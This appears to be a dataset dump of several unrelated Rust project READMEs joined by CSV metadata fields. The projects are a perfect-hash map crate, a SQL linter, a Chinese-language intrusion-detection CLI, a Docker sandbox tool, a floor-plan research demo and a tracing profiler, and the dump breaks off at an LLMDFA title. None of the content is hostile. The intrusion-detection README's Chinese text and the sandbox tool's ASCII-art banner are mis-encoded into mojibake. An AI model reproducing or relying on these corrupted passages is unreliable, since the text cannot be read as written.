`entropy-map` is an ultra-low latency hash map Rust crate using minimal perfect hash functions ([MPHF](https://en.wikipedia.org/wiki/Perfect_hash_function)) and compact encoding of values, designed for scenarios where both memory efficiency and fast data retrieval are critical. Ideal for applications in high-performance computing, `entropy-map` offers a unique blend of speed and compactness.

## Getting Started
Simple example to quickly get started:
```rust
use entropy_map::Mphf;

let keys = [1, 2, 3, 4, 5];
let mphf = Mphf::<32, 8>::from_slice(&keys, 2.0).unwrap();
assert!(mphf.get(&1).is_some());
```

Check out the provided examples for detailed usage:
* [mphf](examples/mphf.rs)
* [map_with_dict](examples/map_with_dict.rs)
* [map_with_dict_bitpacked](examples/map_with_dict_bitpacked.rs)
* [set](examples/set.rs)

## Overview
This crate provides advanced data structures leveraging MPHF, optimized for scenarios requiring high-speed data access and minimal memory usage.
It includes the following key components:

### Minimal Perfect Hash Function (MPHF)
- Implements MPHF based on fingerprinting techniques as detailed in [Fingerprinting-based minimal perfect hashing revisited](https://doi.org/10.1145/3596453)
- Inspired by [ph](https://github.com/beling/bsuccinct-rs/tree/main/ph) crate but with improved rank storage and reduced construction and query times.
- Optimized rank storage mechanism based on [Engineering Compact Data Structures for Rank and Select Queries on Bit Vectors](https://arxiv.org/pdf/2206.01149.pdf)
- Memory usage ranging from `2.10 bits` to `2.71 bits` per key depending on parameters.
- Query time ranging from `5 ns` to `20 ns` depending on the parameters, number of keys and L1-L3 cache sizes.
- Configurable template parameters for flexibility.
  - `B`: group size in bits in [1..64] range, default 32 bits.
  - `S`: defines maximum seed value to try (2^S) in [0..16] range, default 8.
  - `ST`: seed type (unsigned integer), default `u8`.
  - `H`: hasher used to hash keys, default `WyHash`.
- Configurable `gamma` parameter to tune construction time vs query time trade-off.
- Optional [rkyv](https://rkyv.org/) support to enable zero-copy serialization/deserialization of MPHF.

### MapWithDict
- Immutable hash map leveraging MPHF for indexing.
- Stores keys to ensure presence/absence of the key in the map.
- Optimized for space, using a dictionary to pack unique values.
- Efficient storage and retrieval, reducing overall memory footprint.
- Optional [rkyv](https://rkyv.org/) support to enable zero-copy serialization/deserialization and superior memory footprint and performance when compared with `rkyv::ArchivedHashMap`.

### MapWithDictBitpacked
- Specialized version of `MapWithDict`, further optimized for memory usage when values are `Vec<u32>`.
- Bit-packs `Vec<u32>` values for minimal space usage using SIMD instructions.
- Excels in scenarios where values are within a limited range and can be efficiently encoded.

### Set
Special case of `MapWithDict`, optimized for set membership operations.
- Immutable set using MPHF for indexing.
- Stores keys to ensure presence/absence of the key in the set.
- Optional rkyv support to enable zero-copy serialization/deserialization.
",2,0,1,NOASSERTION,"ci.yml,semgrep.yml",3.0
xNaCly/sqleibniz,master,"# sqleibniz

LSP and analysis cli for sql. Check for valid syntax,
semantics and perform dynamic analysis.

> [!WARNING]  
> Sqleibniz is in early stages of development, please keep this in mind before
> creating issues. Contributions are always welcome üíó

## Features

Sqleibniz is a command line tool to analyse sql statements by checking for their static and
dynamic correctness. See below for a list of currently implemented features.

### Supported features

- [ ] static analysis (syntax and semantic analysis)
  - [x] syntax analysis - sqleibniz aims to implement the syntax [sqlite understands](https://www.sqlite.org/lang.html)
  - [ ] warn for sqlites [quirks](https://www.sqlite.org/quirks.html)
  - [ ] do the used tables exist / were they created beforehand
  - [ ] do the used columns exist / were they created beforehand
  - [ ] do the used functions exist / were they created beforehand
  - [ ] are all used types compatible
- [ ] dynamic analysis (runtime analysis via embedded sqlite)
  - [ ] assertions via `@sqleibniz::assert`
  - [ ] were all tables and their columns created correctly (with correct storage classes)
  - [ ] were all stmts executed successfully
- [ ] pretty errors
  - [x] faulty code display with line numbers
  - [x] link to sqlite documentation for each diagnostic
  - [x] ability to omit specific errors depending on their group (Rule)
  - [x] highlighting the error in the faulty code snippet
  - [x] explanation why the specific error was ommitted based on its Rule
  - [ ] possible fix suggestions
  - [x] suggestions for unknown and possible misspelled keywords
- [ ] language server protocol
  - [ ] diagnostics for full sqleibniz analysis
  - [ ] snippets
  - [ ] intelligent completions

### Supported sql statements

| done | `sqlite`-syntax name        | sql example                          | non-standard sql |
| ---- | --------------------------- | ------------------------------------ | ---------------- |
| ‚úÖ   | `explain-stmt`              | `EXPLAIN QUERY PLAN;`                |                  |
|      | `alter-table-stmt`          |                                      |                  |
| ‚úÖ   | `analyze-stmt`              | `ANALYZE my_table;`                  |                  |
|      | `attach-stmt`               |                                      |                  |
| ‚úÖ   | `begin-stmt`                | `BEGIN DEFERRED TRANSACTION;`        |                  |
| ‚úÖ   | `commit-stmt`               | `END TRANSACTION;`                   |                  |
|      | `create-index-stmt`         |                                      |                  |
|      | `create-table-stmt`         |                                      |                  |
|      | `create-trigger-stmt`       |                                      |                  |
|      | `create-view-stmt`          |                                      |                  |
|      | `create-virtual-table-stmt` |                                      |                  |
|      | `delete-stmt`               |                                      |                  |
|      | `delete-stmt-limited`       |                                      |                  |
| ‚úÖ   | `detach-stmt`               | `DETACH DATABASE my_database`        |                  |
| ‚úÖ   | `drop-index-stmt`           | `DROP INDEX my_index;`               |                  |
| ‚úÖ   | `drop-table-stmt`           | `DROP TABLE my_table;`               |                  |
| ‚úÖ   | `drop-trigger-stmt`         | `DROP TRIGGER my_trigger;`           |                  |
| ‚úÖ   | `drop-view-stmt`            | `DROP VIEW my_view;`                 |                  |
|      | `insert-stmt`               |                                      |                  |
|      | `pragma-stmt`               |                                      | sqlite specific  |
|      | `reindex-stmt`              |                                      |                  |
| ‚úÖ   | `release-stmt`              | `RELEASE SAVEPOINT latest_savepoint` |                  |
| ‚úÖ   | `rollback-stmt`             | `ROLLBACK TO latest_savepoint;`      |                  |
| ‚úÖ   | `savepoint-stmt`            | `SAVEPOINT latest_savepoint`         |                  |
|      | `select-stmt`               |                                      |                  |
|      | `update-stmt`               |                                      |                  |
|      | `update-stmt-limited`       |                                      |                  |
| ‚úÖ   | `vacuum-stmt`               | `VACUUM INTO 'repacked.db'`          |                  |

## Installation

### cargo

```
cargo install --git https://github.com/xnacly/sqleibniz
```

#### from source

```shell
git clone https://github.com/xnacly/sqleibniz
cargo install --path .
```

### via `make`

> this builds the project with cargo and moves the resulting binary to
> `/usr/bin/`.

```shell
git clone https://github.com/xnacly/sqleibniz
make
```

Uninstall via:

```shell
make uninstall
```

<!--## Language Server Protocol (lsp)

> [!WARNING]
> This feature is not yet implemented.

### Setup in Neovim

> requires systemwide installation beforehand
-->

## Command line interface usage

```text
LSP and analysis cli for sql. Check for valid syntax, semantics and perform dynamic analysis

Usage: sqleibniz [OPTIONS] [PATHS]...

Arguments:
  [PATHS]...
          files to analyse

Options:
  -i, --ignore-config
          instruct sqleibniz to ignore the configuration, if found

  -c, --config <CONFIG>
          path to the configuration

          [default: leibniz.toml]

  -s, --silent
          disable stdout/stderr output

  -D <DISABLE>
          disable diagnostics by their rules, all are enabled by default - this may change in the future

          Possible values:
          - no-content:                Source file is empty
          - no-statements:             Source file is not empty but holds no statements
          - unimplemented:             Source file contains constructs sqleibniz does not yet understand
          - unknown-keyword:           Source file contains an unknown keyword
          - bad-sqleibniz-instruction: Source file contains invalid sqleibniz instruction
          - unterminated-string:       Source file contains an unterminated string
          - unknown-character:         The source file contains an unknown character
          - invalid-numeric-literal:   The source file contains an invalid numeric literal, either overflow or incorrect syntax
          - invalid-blob:              The source file contains an invalid blob literal, either bad hex data (a-f,A-F,0-9) or incorrect syntax
          - syntax:                    The source file contains a structure with incorrect syntax
          - semicolon:                 The source file is missing a semicolon

  -h, --help
          Print help (see a summary with '-h'
```

### Configuration

Sqleibniz can be configured via a `leibniz.toml` file, this file has to be
accessible to sqleibniz by existing at the path sqleibniz is invoked at.
Consult [src/rules.rs](./src/rules.rs) for configuration documentation and
[leibniz.toml](./leibniz.toml) for said example:

```toml
# this is an example file, consult: https://toml.io/en/ for syntax help and
# src/rules.rs::Config for all available options
[disabled]
    # see sqleibniz --help for all available rules
    rules = [
        # by default, sqleibniz specific errors are disabled:
        ""NoContent"", # source file is empty
        ""NoStatements"", # source file contains no statements
        ""Unimplemented"", # construct is not implemented yet
        ""BadSqleibnizInstruction"", # source file contains a bad sqleibniz instruction

        # ignoring sqlite specific diagnostics:
        # ""UnknownKeyword"", # an unknown keyword was encountered
        # ""UnterminatedString"", # a not closed string was found
        # ""UnknownCharacter"", # an unknown character was found
        # ""InvalidNumericLiteral"", # an invalid numeric literal was found
        # ""InvalidBlob"", # an invalid blob literal was found (either bad hex data or incorrect syntax)
        # ""Syntax"", # a structure with incorrect syntax was found
        # ""Semicolon"", # a semicolon is missing
    ]

```

### sqleibniz instructions

A sqleibniz instrution is prefixed with `@sqleibniz::` and written inside of a
sql single line comment.

#### `expect`

In a similar fashion to ignoring diagnostics via the configuration in
`leibniz.toml`, sqleibniz allows the user to expect diagnostics in the source
file and omit them on a statement by statement basis. To do so, a comment
containing a sqleibniz instruction has to be issued:

```sql
-- will not cause a diagnostic
-- @sqleibniz::expect <explanation for instruction usage here>
-- incorrect, because EXPLAIN wants a sql stmt
EXPLAIN 25;

-- will not cause a diagnostic
-- @sqleibniz::expect <explanation for instruction usage here>
-- incorrect, because 'unknown_table' does not exist
SELECT * FROM unknown_table;

-- will cause a diagnostic
-- incorrect, because EXPLAIN wants a sql stmt, not a literal
EXPLAIN QUERY PLAN 25;
```

Passing the above file to `sqleibniz`:

```text
warn: Ignoring the following diagnostics, according to 'leibniz.toml':
 -> NoContent
 -> NoStatements
 -> Unimplemented
 -> BadSqleibnizInstruction
======================== ./tests/sqleibniz.sql =========================
error[Syntax]: Unexpected Literal
 -> /home/teo/programming/sqleibniz/tests/sqleibniz.sql:12:20
 10 | -- will cause a diagnostic
 11 | -- incorrect, because EXPLAIN wants a sql stmt, not a literal
 12 | EXPLAIN QUERY PLAN 25;
    |                    ^^ error occurs here.
    |
    ~ note: Literal Number(25.0) disallowed at this point.
  * Syntax: The source file contains a structure with incorrect syntax

 docs: https://www.sqlite.org/syntax/sql-stmt.html
=============================== Summary ================================
[-] ./tests/sqleibniz.sql:
    1 Error(s) detected
    0 Error(s) ignored

=> 0/1 Files verified successfully, 1 verification failed.
```

`@sqleibniz::expect` is implemented by inserting a token with the type
`Type::InstructionExpect`. The parser encounters this token and consumes all
token until a token with the type `Type::Semicolon` is found. Thus sqleibniz is
skipping the analysis of the statement directly after the sqleibniz
instruction. A statement is terminated via `;`. `@sqleibniz::expect` therefore
supports ignoring diagnostics for statements spanning either a single line or
multiple lines.

## Contribution

Contributions are always welcome <3, but remember to test all features you contribute.

### Local Dev env

```shell
git clone git@github.com:xNaCly/sqleibniz.git
cargo run example/*
```

### Debugging the parser

Run sqleibniz via cargo with `--features trace_parser` to enable the log of
each `Parser.<stmt_type>_stmt` function. This allows for a deeper insight for
deadlocks etc.

```sql
EXPLAIN VACUUM;
EXPLAIN QUERY PLAN VACUUM;
```

For instance, parsing the above SQL results in a nice tree:

```text
sqleibniz master :: cargo run --features trace_parser -- -i test.sql
   Compiling sqleibniz v0.1.0 (/home/magr6/programming/sqleibniz)
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.83s
     Running `target/debug/sqleibniz -i test.sql`
 ‚Ü≥ Parser::parse() 	with Some(Keyword(EXPLAIN))
  ‚Ü≥ Parser::sql_stmt_list() 	with Some(Keyword(EXPLAIN))
   ‚Ü≥ Parser::sql_stmt_prefix() 	with Some(Keyword(EXPLAIN))
    ‚Ü≥ Parser::sql_stmt() 	with Some(Keyword(VACUUM))
     ‚Ü≥ Parser::vacuum_stmt() 	with Some(Keyword(VACUUM))
    ‚Ü≥ Parser::sql_stmt_prefix() 	with Some(Keyword(EXPLAIN))
     ‚Ü≥ Parser::sql_stmt() 	with Some(Keyword(VACUUM))
      ‚Ü≥ Parser::vacuum_stmt() 	with Some(Keyword(VACUUM))
=============================== Summary ================================
[+] test.sql:
    0 Error(s) detected
    0 Error(s) ignored

=> 1/1 Files verified successfully, 0 verification failed.
```
",0,0,1,,rust.yml,0.0
zhuima/Whoamifuck,main,"# Whoamifuck

Whoamifuck ÊòØ zhuima ÁöÑÁ¨¨‰∏Ä‰∏™ `Rust` ÂëΩ‰ª§Ë°åÂºÄÊ∫êÂ∑•ÂÖ∑„ÄÇËøôÊòØ‰∏Ä‰∏™ÊúÄÂàùÁî± Shell ÁºñÂÜôÁöÑÁî®‰∫éÊ£ÄÊµãÂÖ•‰æµËÄÖÁöÑÂ∑•ÂÖ∑ÔºåÊú¨‰∫∫‰ΩøÁî®RustÂ§çÂàª‰∫Ü Shell ÁâàÁöÑÂÆåÊï¥ÁöÑÂäüËÉΩ„ÄÇ

Êú¨‰ªìÂ∫ìÊòØ`Rust`ÁâàÊú¨ÔºåShell ÁâàËØ∑ÂèÇËÄÉ[ÂéüÁâà](https://github.com/enomothem/Whoamifuck)

![alt text](./docs/demo.png)


## ÂäüËÉΩÁâπÁÇπ

- Âø´ÈÄüÂëΩ‰ª§Áî®‰∫éÂü∫Êú¨Êìç‰Ωú
- ÁâπÊÆäÂëΩ‰ª§Áî®‰∫éÈ´òÁ∫ßÊìç‰Ωú
- È£éÈô©ËØÑ‰º∞ÂëΩ‰ª§
- ÊùÇÈ°πÂëΩ‰ª§Áî®‰∫éÂêÑÁßç‰ªªÂä°
- ËæìÂá∫ÂëΩ‰ª§Áî®‰∫éÁîüÊàêÊä•Âëä

## ÂÆâË£Ö

È¶ñÂÖàÔºåÁ°Æ‰øùÊÇ®ÁöÑÁ≥ªÁªü‰∏äÂÆâË£Ö‰∫Ü Rust„ÄÇÂ¶ÇÊûúÊ≤°ÊúâÔºåËØ∑ËÆøÈóÆ [Rust ÂÆòÁΩë](https://www.rust-lang.org/) ËøõË°åÂÆâË£Ö„ÄÇ

ÁÑ∂ÂêéÔºåÂÖãÈöÜÊ≠§‰ªìÂ∫ìÂπ∂ÁºñËØëÈ°πÁõÆÔºö

```bash
git clone https://github.com/zhuima/Whoamifuck.git
cd Whoamifuck
make all
```


## Á®ãÂ∫èÊµÅÁ®ãÂõæ

‰ª•‰∏ãÊòØ Whoamifuck ‰∏ªË¶ÅÁ®ãÂ∫èÊµÅÁ®ãÁöÑÊó∂Â∫èÂõæÔºö

```mermaid
sequenceDiagram
    actor User
    participant Main
    participant Cli
    participant Commands
    participant Special
    participant System

    User->>Main: Run program
    activate Main

    Main->>Cli: parse()
    activate Cli
    Cli-->>Main: Parsed CLI
    deactivate Cli

    Main->>Commands: match command
    activate Commands

    alt Quick command
        Commands->>Main: Print ""QUICK: {quick:?}""
    else Special command
        Commands->>Special: run()
        activate Special
        Special->>System: new_all()
        activate System
        System-->>Special: system
        Special->>System: refresh_all()
        
        alt proc_serv flag set
            Special->>Special: fk_procserv(&system)
            Special->>System: processes()
            System-->>Special: process list
        end
        
        alt port flag set
            Special->>Special: fk_portstatus(&system)
            Special->>System: networks()
            System-->>Special: network data
        end
        
        alt os_status flag set
            Special->>Special: check_system_status(&system)
            Special->>System: various system info calls
            System-->>Special: system information
        end
        
        Special-->>Commands: Result
        deactivate Special
        deactivate System
        
        alt Error occurred
            Commands->>Main: Print error and exit(1)
        end
    else Risk command
        Commands->>Main: Print ""RISK: {risk:?}""
    else Misc command
        Commands->>Main: Print ""MISC: {misc:?}""
    else Output command
        Commands->>Main: Print ""OUTPUT: {output:?}""
    else No command (None)
        Commands->>Cli: parse_from([""Whoamifuck"", ""--help""])
        Cli-->>Commands: Help information
        Commands->>Main: Print help and exit(0)
    end

    deactivate Commands

    Main-->>User: Program output
    deactivate Main
```



## Ëá™Âä®Ë°•ÂÖ®

#### ÁîüÊàê Bash Ë°•ÂÖ®ËÑöÊú¨Ôºö

```bash
yum install -y bash-completion  # Êàñ apt-get install bash-completion
source <(whoamifuck complete bash)
echo 'source <(whoamifuck complete bash)' >> ~/.bashrc
```

#### ÁîüÊàê Zsh Ë°•ÂÖ®ËÑöÊú¨Ôºö

```bash
source <(whoamifuck complete zsh)
echo 'source <(whoamifuck complete zsh)' >> ~/.zshrc
```


## ‰ΩøÁî®ÊåáÂçó

Whoamifuck ‰ΩøÁî® Clap Â∫ìÊù•ÊûÑÂª∫ÂëΩ‰ª§Ë°åÁïåÈù¢„ÄÇ‰ª•‰∏ãÊòØ‰∏ªË¶ÅÂëΩ‰ª§ÁöÑ‰ΩøÁî®ÊñπÊ≥ïÔºö

### Âø´ÈÄüÂëΩ‰ª§ (quick)

Áî®‰∫éÂü∫Êú¨Êìç‰ΩúÔºö

```bash
./whoamifuck quick --user-device <ËÆæÂ§áÂêç> --login <ÁôªÂΩïÂêç> [--nomal] [--all]
```


- `--user-device`ÔºöÁî®Êà∑ËÆæÂ§áÂêçÁß∞
- `--login`ÔºöÁî®Êà∑ÁôªÂΩïÂêçÔºàÈªòËÆ§ÂÄºÔºö`/var/log/secure;/var/log/auth.log`Ôºâ
- `--nomal`ÔºöÂü∫Êú¨ËæìÂá∫
- `--all`ÔºöÂÆåÊï¥ËæìÂá∫

### ÁâπÊÆäÂëΩ‰ª§ (special)

Áî®‰∫éÈ´òÁ∫ßÊìç‰ΩúÔºö

```bash
./whoamifuck special --user-device <ËÆæÂ§áÂêç> --login <ÁôªÂΩïÂêç> [--nomal] [--all]
```



- `--proc-serv`ÔºöÊ£ÄÊü•Áî®Êà∑ËøõÁ®ãÂíåÊúçÂä°Áä∂ÊÄÅ
- `--port`ÔºöÊ£ÄÊü•Áî®Êà∑Á´ØÂè£ÂºÄÊîæÁä∂ÊÄÅ
- `--os-status`ÔºöÊ£ÄÊü•Á≥ªÁªüÁä∂ÊÄÅ‰ø°ÊÅØ

### È£éÈô©ËØÑ‰º∞ÂëΩ‰ª§ (risk)

```bash
./whoamifuck risk --user-device <ËÆæÂ§áÂêç> --login <ÁôªÂΩïÂêç> [--nomal] [--all]
```




- `--baseline`ÔºöÂÆâÂÖ®Âü∫Á∫øÊ£ÄÊü•
- `--risk`ÔºöÊ£ÄÊü•Á≥ªÁªüÊºèÊ¥û‰ø°ÊÅØ
- `--rootkitcheck`ÔºöÊ£ÄÊü•Á≥ªÁªü rootkit ‰ø°ÊÅØ
- `--webshell`ÔºöÊ£ÄÊü• Web shell ‰ø°ÊÅØÔºàÈªòËÆ§ÂÄºÔºö`/var/www/;/www/wwwroot/..`Ôºâ

### ÊùÇÈ°πÂëΩ‰ª§ (misc)

```bash
./whoamifuck misc --user-device <ËÆæÂ§áÂêç> --login <ÁôªÂΩïÂêç> [--nomal] [--all]
```


- `--code`ÔºöÊ£ÄÊü•È°µÈù¢Â≠òÊ¥ªÁä∂ÊÄÅ
- `--sqletlog`ÔºöÊ£ÄÊü•Áî®Êà∑‰ø°ÊÅØ
- `--auto-run`ÔºöËÆæÁΩÆ crontab ‰ø°ÊÅØ
- `--ext`ÔºöËá™ÂÆö‰πâÂëΩ‰ª§ÂÆö‰πâÊµãËØïÔºàÈªòËÆ§ÂÄºÔºö`~/.whok/chief-inspector.conf`Ôºâ

### ËæìÂá∫ÂëΩ‰ª§ (output)



```bash
./whoamifuck output 
```


- `--output`ÔºöËæìÂá∫Âà∞Êñá‰ª∂
- `--html`ÔºöËæìÂá∫Âà∞ÁªàÁ´ØÔºàHTML Ê†ºÂºèÔºâ

## Á§∫‰æã


ËøõË°åÂÆâÂÖ®Âü∫Á∫øÊ£ÄÊü•Âπ∂ÁîüÊàê HTML Êä•ÂëäÔºö


```bash
./whoamifuck output --html
```


## Ë¥°ÁåÆ

Ê¨¢ËøéÊèê‰∫§ Pull Requests Êù•ÊîπËøõËøô‰∏™Â∑•ÂÖ∑„ÄÇÂú®Êèê‰∫§‰πãÂâçÔºåËØ∑Á°Æ‰øùÊÇ®ÁöÑ‰ª£Á†ÅÁ¨¶ÂêàÈ°πÁõÆÁöÑÁºñÁ†ÅËßÑËåÉÂπ∂ÈÄöËøáÊâÄÊúâÊµãËØï„ÄÇ


## ËÆ∏ÂèØËØÅ

[MIT](./LICENSE)
",6,1,1,MIT,release.yml,0.0
zahash/quarantine,main,"<div align=""center"">

<pre>
 ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù
‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  
‚ñà‚ñà‚ïë‚ñÑ‚ñÑ ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  
‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
 ‚ïö‚ïê‚ïê‚ñÄ‚ñÄ‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù   ‚ïö‚ïê‚ïù   ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
----------------------------------------------------------------------------------
quickly and easily create sandbox to run untrusted code. Made with ‚ù§Ô∏è using ü¶Ä
</pre>

[![Crates.io](https://img.shields.io/crates/v/quarantine.svg)](https://crates.io/crates/quarantine)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

</div>

> `quarantine` is a command-line tool that quickly and easily gives you access to a sandboxed environment to run untrusted code.
It takes your current working directory, mounts it inside a docker container, and provides a shell interface.

## Installation

### Arch Linux

[quarantine](https://aur.archlinux.org/packages/quarantine) is available as a package in the [AUR](https://aur.archlinux.org).<br>
You can install it with your preferred [AUR helper](https://wiki.archlinux.org/title/AUR_helpers). example:

```sh
paru -S quarantine
```

### Other

[Download the binary](https://github.com/zahash/quarantine/releases)

( or )

```
cargo install quarantine
```

## Usage examples

```sh
quarantine --help
quarantine -i node:latest
```

## Meta

zahash ‚Äì zahash.z@gmail.com

Distributed under the MIT license. See `LICENSE` for more information.

[https://github.com/zahash/](https://github.com/zahash/)

## Contributing

1. Fork it (<https://github.com/zahash/quarantine/fork>)
2. Create your feature branch (`git checkout -b feature/fooBar`)
3. Commit your changes (`git commit -am 'Add some fooBar'`)
4. Push to the branch (`git push origin feature/fooBar`)
5. Create a new Pull Request
",2,0,1,MIT,rust.yml,2.0
nobuyuki83/floor_plan,main,"# Free-form Floor Plan Design using Differentiable Voronoi Diagram

![](https://github.com/nobuyuki83/floor_plan/blob/images/teaser.png?raw=true)



|[Paper PDF](https://www.dropbox.com/scl/fi/culi7j1v14r9ax98rfmd6/2024_pg24_floorplan.pdf?rlkey=s5xwncuybrtsj5vyphhn61u0h&dl=0)|



## Publication

> Xuanyu Wu, Kenji Tojo, Nobuyuki Umetani, ""Free-form Floor Plan Design using Differentiable Voronoi Diagram,"" In Proceedings of Pacific Graphics 2024



## Abstract

Designing floor plans is difficult because various constraints must be satisfied by the layouts of the internal walls. This paper presents a novel shape representation and optimization method for designing floor plans based on the Voronoi diagrams. Our Voronoi diagram implicitly specifies the shape of the room using the distance from the Voronoi sites, thus facilitating the topological changes in the wall layout by moving these sites. Since the differentiation of the explicit wall representation is readily available, our method can incorporate various constraints, such as room areas and room connectivity, into the optimization. We demonstrate that our method can generate various floor plans while allowing users to interactively change the constraints.



## How to run

The demos are written in `Rust`. If you don't have Rust on your computer, please install the Rust development environment. Here is the list of commands that generate GIF animations of convergence.

The command ```run --example 0_shapeA --release``` results in following animations (left: random seed = 0, right: random seed = 1)

![](https://github.com/nobuyuki83/floor_plan/blob/images/0_shapeA_0.gif?raw=true)  ![](https://github.com/nobuyuki83/floor_plan/blob/images/0_shapeA_1.gif?raw=true)


----

The command ```run --example 1_shapeB --release``` results in following animations  (left: random seed = 0, right: random seed = 1)

![](https://github.com/nobuyuki83/floor_plan/blob/images/1_shapeB_0.gif?raw=true)  ![](https://github.com/nobuyuki83/floor_plan/blob/images/1_shapeB_1.gif?raw=true)

---

The command ```run --example 2_shapeC --release``` results in following animations  (left: random seed = 4, right: random seed = 7)

![](https://github.com/nobuyuki83/floor_plan/blob/images/2_shapeC_4.gif?raw=true)  ![](https://github.com/nobuyuki83/floor_plan/blob/images/2_shapeC_7.gif?raw=true)


----

The command ```run --example 3_duck --release``` results in following animations (left: random seed = 0, right: random seed = 5)

![](https://github.com/nobuyuki83/floor_plan/blob/images/3_duck_0.gif?raw=true)  ![](https://github.com/nobuyuki83/floor_plan/blob/images/3_duck_5.gif?raw=true)



",0,0,2,MIT,,0.0
soehrl/tracing-tape,main,"# Tracing Tape
Dead-simple debugging and profiling of (distributed) Rust applications using the [tracing](https://docs.rs/tracing) crate.
Record trace files and view them within within seconds without complex setup or configuration.

[![Trace Deck Screenshot](https://github.com/soehrl/tracing-tape/blob/main/trace-deck.png)](https://github.com/soehrl/tracing-tape/blob/main/trace-deck.png)

## Setup
1. Add the following dependencies to your application:
```
cargo add tracing tracing-subscriber tracing-tape-recorder
```
2. Add the following code to your application:
```rust
use tracing::trace_span;
use tracing_subscriber::{fmt, layer::SubscriberExt, Registry};
use tracing_tape_recorder::TapeRecorder;

let subscriber = Registry::default().with(TapeRecorder::default());
let guard = tracing::subscriber::set_default(subscriber);

// ...

drop(guard);
```
Running your application will now generate a `{name}-{timestamp}.tape` file in the current working directory.

**Note:** it is preferred to use `set_default` instead of `set_global_default` to ensure the subsriber is dropped when the guard goes out of scope.
See [#7](https://github.com/soehrl/tracing-tape/issues/7) for more information.

## Viewing Tape Files
You can use the `trace-deck` application to view the recorded tape files either by running `trace-deck filename.tape` or by dragging the files into the window.
You can load multiple files simultaneously which can be useful for analyzing workflows across multiple applications (e.g., client-server interactions).
Have a look at the [getting started guide](https://github.com/soehrl/tracing-tape/wiki/Getting-Started).

## Crates
- tracing-tape: defines the format of the tape files.
- tracing-tape-recorder: records trace events to tape files.
- tracing-tape-parser: parses recorded tape files.
- trace-deck: GUI application for viewing tape files.

## Known Issues
- Currently there is no way, to configure the tape recorder ([#6](https://github.com/soehrl/tracing-tape/issues/6), [#8](https://github.com/soehrl/tracing-tape/issues/8)).
- Recent data is lost when the tape recorder is not properly dropped ([#7](https://github.com/soehrl/tracing-tape/issues/7)).
- Loading large tape files can be slow ([#9](https://github.com/soehrl/tracing-tape/issues/9)).
- Recording tape files will occasionally cause lag spikes ([#10](https://github.com/soehrl/tracing-tape/issues/10)).
",2,6,1,,"build.yml,deploy-trace-deck.yml",18.0
chengpeng-wang/LLMDFA,main,"# LLMDFA: Analyzing Dataflow in Code with Large Language Models

